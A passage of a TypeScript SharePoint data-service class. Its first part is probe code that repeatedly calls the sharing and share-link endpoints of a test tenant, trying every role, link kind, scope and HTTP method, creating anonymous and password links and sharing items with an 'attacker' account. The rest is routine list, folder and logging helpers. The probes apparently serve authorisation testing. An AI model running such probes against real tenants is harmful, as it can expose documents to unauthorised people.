          `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/UnshareLink?@a1=%27${lid}%27`,
          JSON.stringify({ linkKind: kind, shareId: shareIds[index] })
        );
      });
    });
  };
  share_Object = async () => {
    //Share Item
    try {
      const personGroup2 = [
        "attacker@tmsobb2.onmicrosoft.com",
        "tmsobb@tmsobb2.onmicrosoft.com",
        "i:0#.f|membership|attacker@tmsobb2.onmicrosoft.com",
        "i:0#.f|membership|tmsobb@tmsobb2.onmicrosoft.com",
      ];
      for (let pg of personGroup2) {
        for (let role of roles) {
          const body = JSON.stringify({
            includeAnonymousLinkInEmail: true,
            peoplePickerInput: `[{"Key":"${pg}"}]`,
            propagateAcl: false,
            roleValue: `role:${role}`,
            useSimplifiedRoles: true,
            emailBody: "Test Body",
            emailSubject: "Test Subject",
            sendEmail: true,
          });
          const body2 = JSON.stringify({
            includeAnonymousLinkInEmail: true,
            peoplePickerInput: `[{"Key":"${pg}"}]`,
            propagateAcl: true,
            roleValue: `role:${role}`,
            useSimplifiedRoles: true,
            emailBody: "Test Body",
            emailSubject: "Test Subject",
            sendEmail: true,
          });
          const body3 = JSON.stringify({
            includeAnonymousLinkInEmail: true,
            peoplePickerInput: `[{"Key":"${pg}"}]`,
            propagateAcl: true,
            roleValue: `role:${role}`,
            useSimplifiedRoles: false,
            emailBody: "Test Body",
            emailSubject: "Test Subject",
            sendEmail: true,
          });
          this.sendRequest(
            "POST",
            `https://tmsobb2.sharepoint.com/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
            body
          );
          this.sendRequest(
            "POST",
            `https://tmsobb2.sharepoint.com/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
            body2
          );
          this.sendRequest(
            "POST",
            `https://tmsobb2.sharepoint.com/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
            body3
          );
        }
      }
    } catch (error) {
      console.log(error);
    }
  };
  Share_List_Item_XHRCAll1 = async () => {
    const baseUrl = `${SHAREPOINT_CONSTANTS.API_BASE_URL}/SP.Web.ShareObject?$expand=UsersWithAccessRequests,GroupsSharedWith`;
    const itemUrl = `${SHAREPOINT_CONSTANTS.BASE_URL}/_layouts/15/aclinv.aspx?obj=${lid},${itemId},LISTITEM&List=${lid}`;

    for (const rid of roles) {
      for (const pg of personGroup) {
        // Common payload fields
        const payloadBase = {
          url: itemUrl,
          peoplePickerInput: JSON.stringify([{ Key: pg }]),
          roleValue: `role:${rid}`,
          groupId: 0,
          propagateAcl: false,
          sendEmail: true,
          emailSubject: SHAREPOINT_CONSTANTS.EMAIL.SHARING_SUBJECT,
          emailBody: null,
        };

        // First request — include anonymous link
        const payloadWithLink = {
          ...payloadBase,
          includeAnonymousLinkInEmail: true,
          propagateAcl: true,
        };
        this.sendRequest("POST", baseUrl, JSON.stringify(payloadWithLink));

        // Second request — without anonymous link
        const payloadWithoutLink = {
          ...payloadBase,
          includeAnonymousLinkInEmail: false,
        };
        this.sendRequest("POST", baseUrl, JSON.stringify(payloadWithoutLink));
      }
    }

    await this.delay(100);
  };

  Share_List_Item_XHRCAll2 = async () => {
    // Anonymous access enabled, no user specified
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: false,
      // methods: ["POST", "PATCH", "PUT", "MERGE"],
    });

    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: true,
    });
  };

  Share_List_Item_XHRCAll4 = async () => {
    // Anonymous access disabled, no user specified
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: false,
      restrictShareMembership: false,
      customScopes: [0],
    });

    await this.executeShareLinkCombinations({
      allowAnonymousAccess: false,
      restrictShareMembership: true,
      customScopes: [0],
    });
  };

  Share_List_Item_XHRCAll2_dup_expdate = async () => {
    // Future expiration date
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: false,
      expiration: SHAREPOINT_CONSTANTS.DATES.FUTURE_EXPIRATION,
      customScopes: [0],
      delayMs: 40,
    });
  };

  Share_List_Item_XHRCAll2_dup_expdate2 = async () => {
    // Past expiration date
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: false,
      restrictShareMembership: false,
      expiration: SHAREPOINT_CONSTANTS.DATES.PAST_EXPIRATION,
      delayMs: 40,
    });
  };

  Share_List_Item_XHRCAll2_dup_expdate_withUser = async () => {
    // Past expiration date with user
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: false,
      restrictShareMembership: false,
      expiration: SHAREPOINT_CONSTANTS.DATES.PAST_EXPIRATION,
      peoplePickerInput: createPeoplePickerInput(
        SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
      ),
    });
  };

  Share_List_Item_XHRCAll_WithPassword = async () => {
    // Password protected links
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: false,
      password: SHAREPOINT_CONSTANTS.PASSWORDS.TEST_PASSWORD,
      updatePassword: true,
      customKinds: [6],
    });
  };

  Share_List_Item_XHRCAll_WithPassword2 = async () => {
    // Password protected links without anonymous access
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: false,
      restrictShareMembership: false,
      password: SHAREPOINT_CONSTANTS.PASSWORDS.TEST_PASSWORD,
      updatePassword: true,
      customKinds: [6],
      customScopes: [0, 1],
    });
  };

  Share_List_Item_XHRCAll_WithPassword2_withUser = async () => {
    // Password protected links with user
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: false,
      password: SHAREPOINT_CONSTANTS.PASSWORDS.TEJAS_PASSWORD,
      updatePassword: true,
      customKinds: [6],
      customScopes: [0, 1],
      peoplePickerInput: createPeoplePickerInput(
        SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
      ),
    });
  };

  Share_List_Item_XHRCAll2share_wthUsers = async () => {
    // With users, anonymous access enabled
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: false,
      peoplePickerInput: createPeoplePickerInput(
        SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
      ),
    });

    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: true,
      peoplePickerInput: createPeoplePickerInput(
        SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
      ),
    });
  };

  Share_List_Item_XHRCAll2share_wthUsers2 = async () => {
    // With users, anonymous access disabled
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: false,
      restrictShareMembership: false,
      peoplePickerInput: createPeoplePickerInput(
        SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
      ),
    });

    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: false,
      peoplePickerInput: createPeoplePickerInput(
        SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
      ),
    });
  };

  Share_List_Item_XHRCAll2share_wthUsers2_peoplechoosepermission_rm_true =
    async () => {
      // With users, mixed anonymous access settings
      await this.executeShareLinkCombinations({
        allowAnonymousAccess: true,
        restrictShareMembership: false,
        peoplePickerInput: createPeoplePickerInput(
          SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
        ),
      });

      await this.executeShareLinkCombinations({
        allowAnonymousAccess: false,
        restrictShareMembership: true,
        peoplePickerInput: createPeoplePickerInput(
          SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
        ),
      });
    };

  Share_List_Item_XHRCAll_rolekind6 = async () => {
    const customRoles = [5, 6];
    const customScopes = [0];

    // Anonymous access enabled
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: false,
      customRoles,
      customScopes,
      customKinds: [6],
      delayMs: 25,
    });

    await this.delay(40);

    // Anonymous access disabled
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: false,
      restrictShareMembership: false,
      customRoles,
      customKinds: [6],
      delayMs: 30,
    });

    await this.delay(50);

    // With user, anonymous access disabled
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: false,
      restrictShareMembership: false,
      customRoles,
      customKinds: [6],
      peoplePickerInput: createPeoplePickerInput(
        SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
      ),
      delayMs: 25,
    });

    await this.delay(50);

    // With user, anonymous access enabled
    await this.executeShareLinkCombinations({
      allowAnonymousAccess: true,
      restrictShareMembership: true,
      customRoles,
      customScopes,
      customKinds: [6],
      peoplePickerInput: createPeoplePickerInput(
        SHAREPOINT_CONSTANTS.USERS.ATTACKER_EMAIL
      ),
      delayMs: 25,
    });
  };

  Update_Share_List_Item_expdate = async () => {
    let shareId: any[] = await this.getShareLinkIds2();
    let roles: any[] = [1, 2, 3, 4, 5, 6];
    let kinds: any[] = [2, 3, 4, 5, 6];
    try {
      scope.forEach((sid) => {
        roles.forEach((role) => {
          kinds.forEach((kind) => {
            shareId.map((id) => {
              ["POST", "PUT", "PATCH", "MERGE"].forEach((req: any) => {
                var body = `{\"request\":{\"createLink\":true,\"settings\":{\"allowAnonymousAccess\":true,\"trackLinkUsers\":false,\"linkKind\":${kind},\"expiration\":null,\"role\":${role},\"restrictShareMembership\":false,\"shareId\":\"${id}\",\"scope\":${sid},\"nav\":\"\"}}}`;
                this.sendRequest(
                  req,
                  `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/GetItemById(@a2)/ShareLink?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27`,
                  body
                );
              });
            });
          });
        });
      });
    } catch (first) {
      console.log(first);
    }
  };
  Update_Share_List_Item_password = async () => {
    let shareId: any[] = await this.getShareLinkIds2();
    let roles: any[] = [1, 2];
    try {
      scope.forEach((sid) => {
        roles.forEach((role) => {
          shareId.map((id) => {
            var body = `{\"request\":{\"createLink\":true,\"settings\":{\"allowAnonymousAccess\":true,\"trackLinkUsers\":false,\"linkKind\":6,\"expiration\":\"\",\"role\":${role},\"restrictShareMembership\":false,\"updatePassword\":true,\"password\":\"Okkk@1234\",\"shareId\":\"${id}\",\"scope\":${sid},\"nav\":\"\"},\"emailData\":{\"body\":\"\"}}}`;

            let HTTPMethods = ["POST", "PATCH", "PUT", "MERGE"];

            HTTPMethods.forEach((req: any) => {
              this.sendRequest(
                req,
                `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/GetItemById(@a2)/ShareLink?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27`,
                body
              );
            });
          });
        });
      });
    } catch (first) {
      console.log(first);
    }
  };
  updateSharedLinkWithOutPassword = async () => {
    // let ShareIds: any[] = await this.getShareLinkIds();
    let ShareIds = await this.getShareLinkIds2();
    console.log(ShareIds);
    ShareIds.map((id: string) => {
      let HTTPMethods = ["POST", "PATCH", "PUT", "MERGE"];
      HTTPMethods.forEach((req: any) => {
        var body = `{\"request\":{\"createLink\":true,\"settings\":{\"allowAnonymousAccess\":true,\"trackLinkUsers\":false,\"linkKind\":4,\"expiration\":\"${SHAREPOINT_CONSTANTS.DATES.FUTURE_EXPIRATION}\",\"role\":1,\"restrictShareMembership\":false,\"shareId\":\"${id}\",\"scope\":0,\"nav\":\"\"},\"emailData\":{\"body\":\"\"}}}`;
        this.sendRequest(
          req,
          `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/GetItemById(@a2)\/ShareLink?@a1=%27${lid}%27&@a2=%27${itemId}%27`,
          body
        );
      });
    });
  };
  /**
   * Legacy probes are fire-and-forget in a few places, so the shared helper is
   * called with observeRejection: a dropped promise is logged, never unhandled.
   * Awaiting callers still get a real rejection on 4xx/5xx (unlike the old
   * local helper, which resolved every response whose status was truthy).
   */
  private legacyRequest = (
    method: string,
    url: string,
    body: any,
    contentType: string
  ): Promise<unknown> => {
    const payload =
      body === "" || body === undefined || body === null
        ? ""
        : typeof body === "string"
        ? body
        : JSON.stringify(body);
    return sharedSendRequest(method, url, payload, false, {
      contentType: contentType,
      observeRejection: true,
    });
  };

  sendRequest = (
    method: string,
    url: string,
    body: any = "",
    _kind: any = "",
    _role: any = "",
    _scope: any = "",
    _sid: any = ""
  ) => this.legacyRequest(method, url, body, "application/json;odata=verbose");
  sendRequest2 = (
    method: string,
    url: string,
    body: any = "",
    _kind: any = "",
    _role: any = "",
    _scope: any = "",
    _sid: any = ""
  ) => this.legacyRequest(method, url, body, "application/json");

  getShareLinkIds = async (): Promise<any[]> => {
    return new Promise(async (resolve, reject) => {
      let res: any = await this.sendRequest(
        "POST",
        `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/GetItemById(@a2)/GetSharingInformation?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&$Expand=pickerSettings,permissionsInformation,sharingLinkTemplates,addressBarLinkSettings`,
        true
      );
      let ShareIds = await res.d.permissionsInformation.links.results.map(
        (id: any) => id.linkDetails.ShareId
      );
      console.log(ShareIds);
      resolve(ShareIds);
    });
  };
  getShareLinkIds2 = async (): Promise<any[]> => {
    return new Promise((resolve, reject) => {
      let ShareIds: any[] = ["00000000-0000-0000-0000-000000000000"];
      webObj.lists
        .getById(lid)
        .items.getById(itemId)
        .getSharingInformation(
          {
            maxPrincipalsToReturn: 100,
            populateInheritedLinks: true,
            clientSupportedFeatures: "share",
          },
          ["permissionsInformation"],
          ["permissionsInformation", "anyoneLinkTrackUsers"]
        )
        .then(async (res) => {
          ShareIds = await res.permissionsInformation.links.map(
            (link: any) => link.linkDetails.ShareId
          );
          ShareIds.push("00000000-0000-0000-0000-000000000000");
          console.log(ShareIds);
          resolve(ShareIds); // Resolve the promise with ShareIds
        })
        .catch((error) => reject(error)); // Reject the promise in case of an error
    });
  };
  deleteshareLinkXHR = async () => {
    let shareId: any[] = await this.getShareLinkIds();
    shareId.map((id) => {
      kinds.forEach((kind) => {
        webObj.lists
          .getById(lid)
          .items.getById(itemId)
          .deleteSharingLinkByKind(kind);
        var xhr = new XMLHttpRequest();
        xhr.open(
          "POST",
          `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/GetItemById(@a2)\/UnshareLink?@a1=%27${lid}%27&@a2=%27${itemId}%27`,
          true
        );
        xhr.setRequestHeader("content-type", "application/json;odata=verbose");
        xhr.setRequestHeader("accept", "application/json;odata=verbose");
        xhr.setRequestHeader(
          "accept-language",
          "en-GB,en-US;q=0.9,en;q=0.8,mr;q=0.7"
        );
        xhr.setRequestHeader(
          "X-RequestDigest",
          localStorage.getItem("reqd") ?? "*"
        );
        xhr.withCredentials = true;
        var body = `{\"linkKind\":${kind},\"shareId${id}\"`;
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      });
    });
  };

  List_Item_ContentType = () => {
    webObj.lists
      .getById(lid)
      .contentTypes.add("1", "TestContenttype")
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .contentType.descriptionResource("Id")
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .contentType.fieldLinks()
      .catch((first) => console.log(first));
    webObj.lists.getById(lid).items.getById(itemId).contentType.fieldLinks;
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .contentType.fieldLinks.top(1);
    webObj.lists.getById(lid).items.getById(itemId).contentType.fields.top(1);
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .contentType.titleResource("Title")
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .contentType.update({ Title: "text" })
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .contentType.workflowAssociations()
      .catch((first) => console.log(first));
    webObj.lists.getById(lid).items.getById(itemId).contentType.arguments();
    webObj.lists
      .getById(lid)
      .contentTypes.add("1", "TestContenttype")
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .contentType.delete()
      .catch((first) => console.log(first));
  };
  List_Item_userCustomActions = () => {
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.userCustomActions.add({ Title: "tEST" });
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.userCustomActions.getById("3");
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.userCustomActions.getById("3")
      .update({ Title: "Ti" })
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.userCustomActions.getById("3")
      .delete()
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.userCustomActions.getById("3")
      .toRequestUrl();
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.userCustomActions.getById("3")
      .toUrl();
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.userCustomActions.clear()
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.defaultView.fields.add("Test")
      .catch((first) => console.log(first));
    webObj.lists
      .getById(lid)
      .items.getById(itemId)
      .list.getChanges({ Add: true })
      .catch((first) => console.log(first));
  };
  //to get data from the given list
  _getDataFromList(
    listName: string,
    selectColumns: string,
    expandColumns: string,
    filterCondition: string,
    sortByColumnName: string,
    isAscending: boolean
  ): Promise<any> {
    return new Promise<any>(async (resolve, reject) => {
      try {
        webObj.lists.getById(lid).items.select("Title");
      } catch (error) {
        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getDataFromList \n Error-" +
            error.message
        );
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getDataFromList()",
          error.message
        );

        reject(error);
      }
    });
  }

  //to get group details of logged in user
  _getCurrentUserGroups(): Promise<any> {
    return new Promise<any>(async (resolve, reject) => {
      try {
        webObj.currentUser
          .groups()
          .then((val) => {
            resolve(val);
          })
          .catch((error: { message: string }) => {
            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _getCurrentUserGroups \n Error-" +
                error.message
            );
            this._logError(
              "DataService.tsx",
              "DataService",
              "_getCurrentUserGroups()",
              error.message
            );

            reject(error);
          });
      } catch (error) {
        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getCurrentUserGroups \n Error-" +
            error.message
        );
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getCurrentUserGroups()",
          error.message
        );

        reject(error);
      }
    });
  }
  //to get options of given choice column
  async _getChoieData(listName: string, fieldName: string) {
    return new Promise<any>((resolve, reject) => {
      try {
        webObj.lists
          .getById(lid)
          .fields.getByInternalNameOrTitle(fieldName)
          .select("Choices,ID")()
          .then((val) => {
            resolve(val);
          })
          .catch((error) => {
            this._logError(
              "DataService.tsx",
              "DataService",
              "_getChoieData()",
              error.message
            );
            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _getChoieData \n Error-" +
                error.message
            );

            reject(error);
          });
      } catch (error) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getChoieData()",
          error.message
        );
        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getChoieData \n Error-" +
            error.message
        );

        reject(error);
      }
    });
  }
  //to get current user details
  public _getCurrentLoggedInUserData(): Promise<any> {
    return new Promise<any>(async (resolve, reject) => {
      try {
        webObj
          .currentUser()
          .then((val) => {
            resolve(val);
          })
          .catch((error: { message: string }) => {
            this._logError(
              "DataService.tsx",
              "DataService",
              "_getCurrentLoggedInUserData()",
              error.message
            );

            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _getCurrentLoggedInUserData \n Error-" +
                error.message
            );
            reject(error);
          });
      } catch (error) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_getCurrentLoggedInUserData()",
          error.message
        );

        console.log(
          "Exception in DataService : \n Component Name- DataService \n Function Name-  _getCurrentLoggedInUserData \n Error-" +
            error.message
        );
        reject(error);
      }
    });
  }
  //upload image to document library
  public _uploadImageToDocLibrary = (
    documentLibName: string,
    fileName: any,
    file: any,
    overwrite: boolean
  ) => {
    return new Promise<any>((resolve, reject) => {
      try {
        webObj
          .getFolderByServerRelativePath(documentLibName)
          .files.addUsingPath(fileName, file, { Overwrite: overwrite })
          .then((val) => {
            resolve(val);
          })
          .catch((error) => {
            reject(error);
            this._logError(
              "DataService.tsx",
              "DataService",
              "_uploadImageToDocLibrary()",
              error.message
            );
            console.log(
              "Exception in DataService : \n Component Name-dataService \n Function Name- _uploadImageToDocLibrary \n Error-" +
                error.message
            );
          });
      } catch (error) {
        reject(error);
        this._logError(
          "DataService.tsx",
          "DataService",
          "_uploadImageToDocLibrary()",
          error.message
        );
        console.log(
          "Exception in DataService : \n Component Name-dataService \n Function Name- _uploadImageToDocLibrary \n Error-" +
            error.message
        );
      }
    });
  };
  public async _createFolderInList(listName: string, folderName: any) {
    return new Promise<any>((resolve, reject) => {
      try {
        webObj.lists
          .getById(lid)
          .items.add({ Title: folderName, ContentTypeId: "0x0120" })
          .then((result) => {
            return result.item
              .update({
                Title: folderName.toString(),
                FileLeafRef: `${folderName}`,
              })
              .then((v: any) => {
                resolve(v);
              })
              .catch((err: any) => {
                this._logError(
                  "DataService.tsx",
                  "DataService",
                  "_createFolderInList()",
                  err.message
                );
                console.log(
                  "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _createFolderInList \n Error-" +
                    err.message
                );
                reject(err);
              });
          })
          .catch((err) => {
            this._logError(
              "DataService.tsx",
              "DataService",
              "_createFolderInList()",
              err.message
            );
            console.log(
              "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _createFolderInList \n Error-" +
                err.message
            );
            reject(err);
          });
      } catch (err) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_createFolderInList()",
          err.message
        );
        console.log(
          "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _createFolderInList \n Error-" +
            err.message
        );
        reject(err);
      }
    });
  }
  //check if folder exists or create new one
  public async _ensureFolder(
    uploadPath: string,
    listName: string,
    folderName: string
  ): Promise<any> {
    return new Promise<any>((resolve, reject) => {
      try {
        webObj
          .getFolderByServerRelativePath(uploadPath)
          .select("Exists")()
          .then((response) => {
            if (response.Exists === false) {
              this._createFolderInList(listName, folderName)
                .then((r) => {
                  resolve(r);
                })
                .catch((error) => {
                  this._logError(
                    "DataService.tsx",
                    "DataService",
                    "_ensureFolder()",
                    error.message
                  );
                  console.log(
                    "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _ensureFolder \n Error-" +
                      error.message
                  );
                  reject(error);
                });
            }
          })
          .catch((err) => {
            this._logError(
              "DataService.tsx",
              "DataService",
              "_ensureFolder()",
              err.message
            );
            console.log(
              "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _ensureFolder \n Error-" +
                err.message
            );
            reject(err);
          });
      } catch (err) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_ensureFolder()",
          err.message
        );
        console.log(
          "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _ensureFolder \n Error-" +
            err.message
        );
        reject(err);
      }
    });
  }

  public async _addMultipleListItems(listName: string, itemInfo: any) {
    return new Promise<any>(async (resolve, reject) => {
      try {
        const list = webObj.lists.getById(lid);
        const [batchedSP, execute] = createBatch(list);
        list.using(batchedSP);
        itemInfo.forEach((item: any) => {
          list.items.add(item).catch((error) => reject(error));
        });
        await execute()
          .then((response) => resolve(true))
          .catch((e: any) => {
            reject(e);
          });
      } catch (error) {
        console.log(error);
        this._logError(
          "DataService.tsx",
          "DataService",
          "_addMultipleListItems()",
          error.message
        );
        console.log(
          "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _addMultipleListItems \n Error-" +
            error.message
        );
        reject(error);
      }
    });
  }

  // public async _updateListItemInFolder1(listName: string, itemInfo: any) {
  //   return new Promise<any>(async (resolve, reject) => {
  //     try{
  //     const [batchedSP, execute] = sp.batched();
  //     const list = batchedSP.web.lists.getById(lid);
  //     const res: any[] = [];
  //     itemInfo.forEach((item: any) => {
  //       let id = 0;
  //       id = item !== undefined && item.length > 0 && item.filter((field: any) => field.FieldName === 'Id').length > 0 ? item.filter((field: any) => field.FieldName === 'Id')[0].FieldValue : 0;
  //       item = item.filter((obj: any) => {
  //         return obj.FieldName !== "Id";
  //       });
  //       list.items.getById(id).validateUpdateListItem(
  //         item
  //       ).then(r => res.push(r)).catch(r => res.push(r));
  //     });
  //     const errorCount: any[] = [];
  //     await execute().then((s) => {
  //       for (let i = 0; i < res.length; i++) {
  //         const errors = res[i].filter((field: any) => field.ErrorMessage !== null);
  //         if (errors.length > 0) {
  //           errorCount.push(i);
  //         }
  //         if (i === (res.length - 1)) {
  //           resolve(errorCount);
  //         }
  //       }
  //     }).catch((e) => {
  //       this._logError("DataService.tsx", "DataService", "_updateListItemInFolder1()", e.message);
  //       console.log("Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _updateListItemInFolder1 \n Error-" + e.message);
  //       reject(errorCount);
  //     });
  //   }catch(error){
  //     this._logError("DataService.tsx", "DataService", "_updateListItemInFolder1()", error.message);
  //       console.log("Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _updateListItemInFolder1 \n Error-" + error.message);
  //       reject(error);
  //   }});
  // }

  public _updateFolderOfListByTitle = (listName: string, title: string) => {
    return new Promise<any>(async (resolve, reject) => {
      try {
        const item = await webObj.lists
          .getById(lid)
          .items.filter(`Title eq 'xyz'`)();
        if (item.length === 0) {
          reject(
            new Error(
              `Item with title '${title}' not found in the list '${listName}'.`
            )
          );
          return;
        }
        const itemId = item[0].Id;
        await webObj.lists.getById(lid).items.getById(itemId).update({
          Title: "iiiiiiiiiiiiii",
        });
        resolve("Item updated successfully.");
      } catch (error) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_updateFolderOfListByTitle()",
          error.message
        );
        console.log(
          "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _updateFolderOfListByTitle \n Error-" +
            error.message
        );
        reject(error);
      }
    });
  };

  public _createList = (listName: string): Promise<any> => {
    return new Promise<any>(async (resolve, reject) => {
      try {
        // const choices = [`Completed`, `Delayed`, `Need Attention`, `On Track`];
        // ensure that a list exists. If it doesn't it will be created with the provided title (the rest of the settings will be default):
        const listCreationResponse = await webObj.lists.ensure(
          listName,
          "",
          undefined,
          undefined,
          { Hidden: true }
        );
        const list = await listCreationResponse.list;
        const [batchedSP, execute] = createBatch(list);
        list.using(batchedSP);

        list.fields.addMultilineText("OverallComments", {
          RichText: false,
          RestrictedMode: false,
          AppendOnly: false,
          AllowHyperlink: true,
          Hidden: false,
        });
        list.fields.addMultilineText("ChangeManagementComments", {
          RichText: false,
          RestrictedMode: false,
          AppendOnly: false,
          AllowHyperlink: true,
          Hidden: false,
        });
        list.fields.addMultilineText("FinanceComments", {
          RichText: false,
          RestrictedMode: false,
          AppendOnly: false,
          AllowHyperlink: true,
          Hidden: false,
        });
        await execute();
        resolve(listCreationResponse.created);
      } catch (error) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_createList()",
          error.message
        );
        console.log(
          "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _createList \n Error-" +
            error.message
        );
        reject(error);
      }
    });
  };

  public _deleteList = (listName: string): Promise<any> => {
    return new Promise<void>(async (resolve, reject) => {
      try {
        await webObj.lists
          .getById(lid)
          .delete()
          .then((res) => resolve(res))
          .catch((error) => {
            this._logError(
              "DataService.tsx",
              "DataService",
              "_deleteList()",
              error.message
            );
            console.log(
              "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _deleteList \n Error-" +
                error.message
            );
            reject(error);
          });
      } catch (error) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_deleteList()",
          error.message
        );
        console.log(
          "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _deleteList \n Error-" +
            error.message
        );
        reject(error);
      }
    });
  };

  public _getCommentsData = (listName: string, id: number) => {
    const items: any = [];
    return new Promise<any>((resolve, reject) => {
      try {
        webObj.lists
          .getById(lid)
          .items.getById(id)
          .versions()
          .then((versions) => {
            versions.forEach((item: any, index: number) => {
              if (item.Comments !== null && item.Comments !== "") {
                items.push({
                  versionId: item.VersionId,
                  comments: item.Comments,
                  commentDateTime: item.Created,
                  commentBy: item.Editor.LookupValue,
                });
              }
            });
            resolve(items);
          })
          .catch((error: { message: string }) => {
            console.log(
              "Exception in DataService : \n Component Name- DataService \n Function Name-  _getCommentsData \n Error-" +
                error.message
            );
            this._logError(
              "DataService.tsx",
              "DataService",
              "_getCommentsData()",
              error.message
            );
            reject(error);
          });
      } catch (error) {
        this._logError(
          "DataService.tsx",
          "DataService",
          "_createList()",
          error.message
        );
        console.log(
          "Exception in DataService.tsx : \n Component Name- DataService \n Function Name-  _getCommentsData() \n Error-" +
            error.message
        );
        reject(error);
      }
    });
  };

  // To get the current week from the initiative status list

  //to check whether current user has only read access
  public _checkifCurrentUserVisitor = async () => {
    let isVisitor: boolean = true;
    try {
      const perms = await webObj.getCurrentUserEffectivePermissions();
      if (
        webObj.hasPermissions(perms, PermissionKind.AddListItems) ||
        webObj.hasPermissions(perms, PermissionKind.FullMask) ||
        webObj.hasPermissions(perms, PermissionKind.EditListItems) ||
        webObj.hasPermissions(perms, PermissionKind.DeleteListItems)
      ) {
        isVisitor = false;
      }
    } catch (error) {
      console.log(
        "Exception in DataService : \n Component Name-DataService.ts \n Function Name-_checkifCurrentUserVisitor \n Error-" +
          error.message
      );
      this._logError(
        "DataService.tsx",
        "DataService",
        "_checkifCurrentUserVisitor()",
        error.message
      );
    }
    return isVisitor;
  };
  public _logError = (
    fileName: string,
    componentName: string,
    functionName: string,
    errMessage: string
  ) => {
    return new Promise<any>(async (resolve, reject) => {
      try {
        await webObj.lists
          .getByTitle(`"${listName}"`)
          .items.add({
            File_x0020_Name: fileName,
            Component_x0020_Name: componentName,
            Function_x0020_Name: functionName,
            Error_x0020_Message: errMessage,
          })
          .then((result) => {
            resolve(result);
